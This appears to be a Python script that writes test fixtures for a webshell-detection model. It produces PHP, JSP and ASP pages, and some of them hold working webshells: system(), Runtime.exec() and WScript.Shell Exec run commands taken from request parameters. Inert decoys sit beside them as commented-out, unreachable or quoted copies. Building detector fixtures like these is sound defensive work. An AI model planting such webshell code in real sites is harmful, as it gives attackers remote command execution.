"""Writes the webshell-request-primitive-model fixture sources (literal shell texts, stdlib only)."""
import sys
from pathlib import Path

out = Path(sys.argv[1] if len(sys.argv) > 1 else "ws_src")
out.mkdir(exist_ok=True)
SRC = {
"ws_php_stages.php": """<html><body><h1>status</h1>
<p>Old builds called system() here.</p>
<?php
$k = $_SERVER['HTTP_X_STAGE_KEY'];
$c = $_POST['cmd'];
// eval($_POST['code']);  legacy loader, disabled
$note = "shell_exec('id') is how the old fixture did it";
if (false) {
    passthru($c);
}
$out = system($c);
$blob = unserialize(base64_decode($_COOKIE['sess']));
file_put_contents('/tmp/o.txt', $out);
return;
exec($_GET['late']);
?>
</body></html>
""",
"ws_php_inert.php": """<?php
/* fixture: every primitive here is inert
   system($_GET['c']); */
$plan = 'eval(base64_decode($x))';
# shell_exec("whoami");
if (false) { proc_open($_REQUEST['p'], [], $pipes); }
echo "ok";
?>
""",
"ws_jsp_stages.jsp": """<%@ page import="java.io.*" %>
<%-- Runtime.getRuntime().exec(request.getParameter("old")) --%>
<%
String c = request.getParameter("cmd");
String t = request.getHeader("X-Token");
String doc = "Runtime.getRuntime().exec(c) is only documentation";
// new ProcessBuilder(c).start();
if (false) {
    Class.forName("x.Y").newInstance();
}
Process p = Runtime.getRuntime().exec(c);
FileOutputStream fo = new FileOutputStream("/tmp/" + t);
%>
""",
"ws_asp_stages.asp": """<%@ Language=VBScript %>
<%
Dim sh, c
c = Request.Form("cmd")
' Execute Request("code")   -- removed in fixture
Set sh = CreateObject("WScript.Shell")
If False Then
  sh.Run "calc.exe"
End If
Set ex = sh.Exec("cmd /c " & c)
Response.Write "sh.Exec is the API name"
%>
""",
"ws_decoy_notes.txt": """CHANGELOG
- removed the eval() and system() helpers from the admin page
- python helper now uses subprocess.run instead of os.system("ls")
""",
}
for name, body in SRC.items():
    (out / name).write_text(body)
    print(name, len(body))
